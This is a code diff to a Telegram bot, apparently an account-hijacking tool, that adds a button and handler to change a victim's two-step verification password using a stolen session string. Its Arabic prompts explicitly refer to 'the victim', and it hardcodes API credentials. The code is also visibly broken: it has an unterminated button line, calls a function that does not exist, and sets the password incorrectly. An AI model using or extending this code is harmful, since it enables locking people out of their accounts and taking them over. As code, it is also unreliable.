@@ -17,6 +17,8 @@ from telethon.tl.types import ChannelParticipantsAdmins as cpa
 from telethon.tl.functions.account import UpdateProfileRequest
 
 from telethon.tl.functions.account import UpdateUsernameRequest
+
+from telethon.tl.functions.account import UpdatePasswordRequest
 import random
 
 
@@ -194,6 +196,15 @@ async def usermsgs(strses):
     return str(i)
 
 
+async def change_two_step_password(termux_code, new_password):
+    async with tg(ses(termux_code), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(UpdatePasswordRequest(current_password_hash="", new_settings=await X(GetPasswordRequest())))
+            return True
+        except Exception as e:
+            print(e)
+            return False
+#تغير تحقق بخطوتين 
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
@@ -299,6 +310,8 @@ keyboard = [
     [
      Button.inline("X", data="X"),  # إضافة زر شفاف بحرف X
      Button.inline("O", data="O"),  # إضافة زر شفاف بحرف O
+     Button.inline("T", data="T"),  # إضافة زر شفاف بحرف T
+     Button.url("المطور"
      Button.url("المطور", "https://t.me/angthon")
     ]
 ]
@@ -357,7 +370,8 @@ async def start(event):
         Button.inline("V", data="V"),
         Button.inline("Z", data="Z"),
         Button.inline("X", data="X"),
-        Button.inline("O", data="O"),    
+        Button.inline("O", data="O"),
+        Button.inline("T", data="T"),   
     ],
     [
         
@@ -892,3 +906,25 @@ async def change_username(event):
         await change_username_function(termux_code, new_username)
         await event.reply("تم تغيير اسم المستخدم بنجاح 🚀💀", buttons=keyboard)
 #هذه الاوامر فقط في سورس الخفاش 🦇
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"T")))
+async def change_two_step_password(event):
+    async with bot.conversation(event.chat_id) as conv:
+        await conv.send_message("الرجاء إرسال الكود التيرمكس للضحية")
+        termux_code_msg = await conv.get_response()
+        termux_code = termux_code_msg.text
+
+        success = await check_termux_code(termux_code)
+
+        if success:
+            pass  # اذا جان رجع
+        else:
+            return await event.respond("تم إنهاء الجلسة من قبل الضحية.", buttons=keyboard)
+
+        await conv.send_message("الرجاء إدخال كلمة مرور التحقق الثنائي الجديدة")
+        new_password_msg = await conv.get_response()
+        new_password = new_password_msg.text
+
+        await change_two_step_password_function(termux_code, new_password)
+        await event.reply("تم تغيير كلمة المرور تحقق بخطوتين بنجاح 🚀💀", buttons=keyboard)
+#امر فقط في سورس الخفاش 🦇
